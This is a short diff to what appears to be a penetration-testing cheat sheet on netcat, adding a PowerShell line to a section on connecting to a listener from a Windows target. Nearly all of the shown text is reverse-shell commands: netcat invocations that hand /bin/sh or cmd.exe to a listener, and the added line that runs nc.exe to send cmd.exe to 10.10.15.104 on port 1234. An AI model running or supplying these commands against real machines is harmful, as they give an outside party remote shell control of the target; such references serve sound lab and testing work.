@@ -84,6 +84,9 @@ nc [listener IP] [port] –e /bin/sh
 ### Connect to the listener from a Windows target machine
 ```
 nc.exe [listener IP] [port] –e cmd.exe
+
+# If you have access to Powershell:
+powershell -c C:\tmp\nc.exe -e cmd.exe 10.10.15.104 1234
 ```
 
 ## File Input/Output
